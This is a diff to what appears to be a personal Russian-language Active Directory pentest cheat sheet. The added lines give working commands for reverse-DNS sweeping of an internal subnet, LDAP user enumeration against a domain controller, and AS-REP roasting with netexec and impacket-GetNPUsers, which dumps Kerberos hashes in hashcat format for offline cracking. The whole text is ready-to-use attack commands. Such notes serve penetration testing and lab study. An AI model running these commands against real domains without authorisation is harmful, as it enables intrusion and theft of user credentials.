@@ -149,3 +149,20 @@ nxc smb -u 'users' -p 'password' --pass-pol
 проверка Трастов (доверительных отношений в домене) Powershell
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 
+
+# сбор DNS в домене
+сканируем udp 53 порт
+добавляем ip sudo nano /etc/resolv.conf  
+nameserver ip
+for i in {1..254}; do echo -n "10.5.2.$i "; dig +short -x 10.5.2.$i; done >
+/tmp/ptrs.txt
+
+#сбор пользователей (обращение к контролеру домена)
+ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=user'
+или nxc ldap 10.5.2.2 --users | awk '{print $5}' > users.txt
+
+#Asreproasting
+nxc ldap 10.5.2.2 -u users.txt -p '' --asreproast asreproast.txt
+или
+sudo impacket-GetNPUsers telecore.ad/ -dc-ip 10.5.2.2 -usersfile users.txt -format hashcat | grep -v 'Kerberos SessionError'
+
